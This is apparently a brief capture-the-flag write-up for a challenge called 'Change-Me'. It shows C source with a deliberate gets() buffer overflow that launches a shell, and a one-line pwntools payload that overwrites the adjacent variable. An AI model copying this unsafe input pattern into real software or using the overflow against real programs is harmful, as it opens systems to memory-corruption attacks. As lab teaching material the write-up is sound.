# Change-Me:
* given source code:

```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main()
{
	setvbuf(stdin,NULL,2,0);
	setvbuf(stdout,NULL,2,0);
	int Overwrite_Me=0;
	char buf[32];
	gets(buf);
	if(Overwrite_Me==0x1234)
	{
		execve("/bin/sh",NULL,NULL);	
		exit(0);	
	}
	else
	{
		puts("Sorry folks! ,You still have to work your way!");
	}
	return 0;
}
```
* Overflowing buffer so that buf = 0x1234.

```
python -c "from pwn import *; print('A'*32 + p32(0x1234))" | ./Change_Me.chall
``
